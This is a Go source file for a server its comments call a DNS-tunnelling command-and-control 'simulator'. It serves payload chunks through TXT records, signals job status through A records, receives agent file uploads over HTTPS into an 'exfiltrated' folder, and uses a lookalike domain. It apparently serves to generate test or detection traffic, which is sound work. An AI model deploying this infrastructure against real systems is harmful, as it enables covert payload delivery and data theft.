// C2 Server - DNS Tunneling Simulator
//
// This server acts as an authoritative nameserver for the configured domain.
// It responds to:
//   - A record queries: Returns job status encoded as IP ranges
//   - TXT record queries: Returns base64-encoded payload chunks
//
// Additionally, it runs:
//   - HTTP API (localhost only) to trigger job state
//   - HTTPS listener for file uploads from agent
//
// USAGE:
//  1. Configure variables below
//  2. Ensure your domain's NS records point to this server's IP
//  3. Run: sudo go run ./cmd/server
//  4. Trigger a job: curl -X POST http://localhost:9090/trigger
package main

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"

	"motd_joker_screenmate/internal/dns"
	"motd_joker_screenmate/internal/https"
)

// =============================================================================
// CONFIGURATION - Modify these variables for your environment
// =============================================================================

var (
	// Domain is the base domain for DNS queries.
	// Your DNS registrar must have NS records pointing to this server.
	Domain = "timeserversync.com"

	// PayloadFile is the file to transfer via TXT records when a job is triggered.
	// Use a ~2MB file for realistic traffic generation.
	PayloadFile = "./payloads/payload.jpg"

	// CertDir is where TLS certificates are stored/generated.
	// If cert.pem and key.pem don't exist, they'll be auto-generated.
	CertDir = "./certs"

	// DNSPort is the port for the authoritative DNS server.
	// Must be 53 for standard DNS resolution to work.
	DNSPort = 53

	// HTTPSPort is the port for receiving file uploads from the agent.
	HTTPSPort = 8443

	// TriggerPort is the localhost-only HTTP API port for triggering jobs.
	TriggerPort = 9090

	// ExfilDir is where files uploaded by the agent are saved.
	ExfilDir = "./exfiltrated"
)

// Global reference to DNS server (needed by HTTP handlers)
var dnsServer *dns.Server

func main() {
	printBanner()

	// Create DNS server instance
	dnsServer = dns.NewServer(Domain, DNSPort)

	// Start DNS server in a goroutine (it blocks)
	go func() {
		log.Printf("[DNS] Starting authoritative DNS server on :%d for %s", DNSPort, Domain)
		if err := dnsServer.Start(); err != nil {
			log.Fatalf("[DNS] Server failed: %v", err)
		}
	}()

	// Start trigger API in a goroutine
	go func() {
		log.Printf("[API] Starting trigger API on localhost:%d", TriggerPort)
		if err := startTriggerAPI(); err != nil {
			log.Fatalf("[API] Server failed: %v", err)
		}
	}()

	// Start HTTPS server in a goroutine
	go func() {
		log.Printf("[HTTPS] Starting file receiver on :%d", HTTPSPort)
		httpsServer := https.NewServer(HTTPSPort, CertDir, ExfilDir)
		if err := httpsServer.Start(); err != nil {
			log.Fatalf("[HTTPS] Server failed: %v", err)
		}
	}()

	printUsage()

	// Wait for shutdown signal
	waitForShutdown()
}

func printBanner() {
	banner := `
╔═══════════════════════════════════════════════════════════════════╗
║           DNS TUNNEL C2 SERVER - Joker Screenmate Simulator       ║
╠═══════════════════════════════════════════════════════════════════╣
║  Domain:        %-50s ║
║  DNS Port:      %-50d ║
║  HTTPS Port:    %-50d ║
║  Trigger Port:  %-50d ║
║  Payload File:  %-50s ║
║  Exfil Dir:     %-50s ║
╚═══════════════════════════════════════════════════════════════════╝
`
	fmt.Printf(banner, Domain, DNSPort, HTTPSPort, TriggerPort, PayloadFile, ExfilDir)
}

func printUsage() {
	usage := `
┌─────────────────────────────────────────────────────────────────────┐
│  SERVER READY - Waiting for agent connections                       │
├─────────────────────────────────────────────────────────────────────┤
│  Trigger a job (starts TXT transfer on next beacon):                │
│    curl -X POST http://localhost:9090/trigger                       │
│                                                                     │
│  Trigger with custom payload:                                       │
│    curl -X POST "http://localhost:9090/trigger?file=/path/to/file"  │
│                                                                     │
│  Check status:                                                      │
│    curl http://localhost:9090/status                                │
│                                                                     │
│  Press Ctrl+C to stop                                               │
└─────────────────────────────────────────────────────────────────────┘
`
	fmt.Println(usage)
}

// waitForShutdown blocks until SIGINT or SIGTERM is received.
func waitForShutdown() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	sig := <-sigChan
	log.Printf("[MAIN] Received signal %v, shutting down...", sig)
	os.Exit(0)
}

// startTriggerAPI starts the HTTP server for the trigger endpoint.
// This only listens on localhost for security.
func startTriggerAPI() error {
	mux := http.NewServeMux()

	// POST /trigger - Activate job state
	mux.HandleFunc("/trigger", handleTrigger)

	// GET /status - Check current state (useful for debugging)
	mux.HandleFunc("/status", handleStatus)

	// Listen only on localhost (security: agent cannot trigger jobs remotely)
	addr := fmt.Sprintf("127.0.0.1:%d", TriggerPort)
	return http.ListenAndServe(addr, mux)
}

// handleTrigger activates a job, loading the payload file for TXT transfer.
func handleTrigger(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed. Use POST.", http.StatusMethodNotAllowed)
		return
	}

	// Check for custom payload file in query params
	payloadPath := r.URL.Query().Get("file")
	if payloadPath == "" {
		payloadPath = PayloadFile // Use default
	}

	log.Printf("[API] Trigger request received. Payload: %s", payloadPath)

	// Trigger the job
	if err := dnsServer.TriggerJob(payloadPath); err != nil {
		log.Printf("[API] Failed to trigger job: %v", err)
		http.Error(w, fmt.Sprintf("Failed to trigger job: %v", err), http.StatusInternalServerError)
		return
	}

	msg := fmt.Sprintf("Job triggered successfully. Payload: %s", payloadPath)
	log.Printf("[API] %s", msg)
	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, msg)
}

// handleStatus returns the current server state.
func handleStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed. Use GET.", http.StatusMethodNotAllowed)
		return
	}

	jobPending := dnsServer.IsJobPending()

	status := "NO_JOB"
	if jobPending {
		status = "JOB_PENDING"
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprintf(w, "Status: %s\n", status)
}
